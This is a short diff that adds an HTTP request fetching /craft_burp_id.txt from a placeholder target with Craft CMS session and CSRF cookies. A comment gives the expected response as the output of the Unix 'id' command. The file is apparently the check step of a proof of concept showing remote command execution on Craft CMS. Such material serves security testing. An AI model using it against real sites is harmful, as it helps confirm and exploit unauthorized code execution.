@@ -1,0 +1,7 @@
+GET /craft_burp_id.txt HTTP/2
+Host: TARGET
+Cookie: CRAFT_CSRF_TOKEN=xxx; craft_session=xxx
+Accept: text/plain, */*
+
+// Expected response:
+// uid=501(user) gid=20(dialout) groups=20(dialout)
